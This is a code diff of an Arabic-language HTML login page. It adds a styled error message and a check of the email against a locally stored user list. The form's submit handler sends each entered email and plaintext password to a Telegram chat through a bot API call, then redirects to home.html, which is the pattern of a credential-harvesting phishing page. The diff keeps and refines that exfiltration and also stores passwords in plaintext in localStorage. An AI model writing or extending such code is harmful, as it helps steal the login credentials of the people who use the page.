@@ -96,6 +96,17 @@
         }
         .input-group i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-color); }
 
+        /* تنسيق رسالة الخطأ */
+        #error-msg {
+            color: #ff4d4d;
+            font-size: 0.75rem;
+            text-align: right;
+            margin: -10px 5px 10px 0;
+            display: none;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        }
+
         /* تنسيق زر تذكرني */
         .remember-me {
             display: flex;
@@ -151,6 +162,8 @@
                 <input type="password" id="password" placeholder="كلمة المرور" required>
             </div>
 
+            <div id="error-msg">حساب غير مسجل، يرجى النقر على "سجل الآن" أولاً.</div>
+
             <label class="remember-me">
                 <input type="checkbox" id="remember">
                 <span>تذكر بياناتي</span>
@@ -165,11 +178,9 @@
     </div>
 
     <script>
-        // دالة تبديل الوضع
         function toggleTheme() {
             const body = document.documentElement;
             const icon = document.getElementById('theme-icon');
-            
             if (body.getAttribute('data-theme') === 'dark') {
                 body.removeAttribute('data-theme');
                 icon.className = 'fas fa-moon';
@@ -181,18 +192,13 @@
             }
         }
 
-        // حفظ الاختيار حتى بعد تحديث الصفحة + جلب البيانات لو "تذكرني" مفعل
         window.onload = () => {
-            // كود الوضع الليلي
             if (localStorage.getItem('theme') === 'dark') {
                 document.documentElement.setAttribute('data-theme', 'dark');
                 document.getElementById('theme-icon').className = 'fas fa-sun';
             }
-
-            // التحقق من وجود بيانات محفوظة (تذكرني)
             const savedEmail = localStorage.getItem('remembered_email');
             const savedPass = localStorage.getItem('remembered_password');
-            
             if (savedEmail && savedPass) {
                 document.getElementById('email').value = savedEmail;
                 document.getElementById('password').value = savedPass;
@@ -200,16 +206,28 @@
             }
         }
 
-        // كود التليجرام + خاصية الحفظ
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const email = document.getElementById('email').value;
+            const emailInput = document.getElementById('email').value.trim();
             const pass = document.getElementById('password').value;
             const remember = document.getElementById('remember').checked;
-            
-            // التعامل مع "تذكرني"
+            const errorMsg = document.getElementById('error-msg');
+
+            // --- التعديل الجوهري هنا ---
+            // جلب قائمة المستخدمين المسجلين (بفرض أن صفحة signup تحفظهم في هذا المفتاح)
+            let registeredUsers = JSON.parse(localStorage.getItem('users_list')) || [];
+
+            // التحقق: هل الإيميل المدخل موجود في القائمة؟
+            if (!registeredUsers.includes(emailInput)) {
+                errorMsg.style.display = 'block'; // إظهار الرسالة الحمراء
+                return; // منع إرسال البيانات للتليجرام ومنع التحويل لصفحة home
+            }
+            // ---------------------------
+
+            errorMsg.style.display = 'none';
+
             if (remember) {
-                localStorage.setItem('remembered_email', email);
+                localStorage.setItem('remembered_email', emailInput);
                 localStorage.setItem('remembered_password', pass);
             } else {
                 localStorage.removeItem('remembered_email');
@@ -224,7 +242,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: chatId, 
-                    text: `👤 دخول جديد:\n📧 الإيميل: ${email}\n🔒 الباسورد: ${pass}\n📌 تذكرني: ${remember ? 'نعم' : 'لا'}` 
+                    text: `👤 دخول جديد:\n📧 الإيميل: ${emailInput}\n🔒 الباسورد: ${pass}\n📌 تذكرني: ${remember ? 'نعم' : 'لا'}` 
                 })
             }).then(() => window.location.href = "home.html");
         });
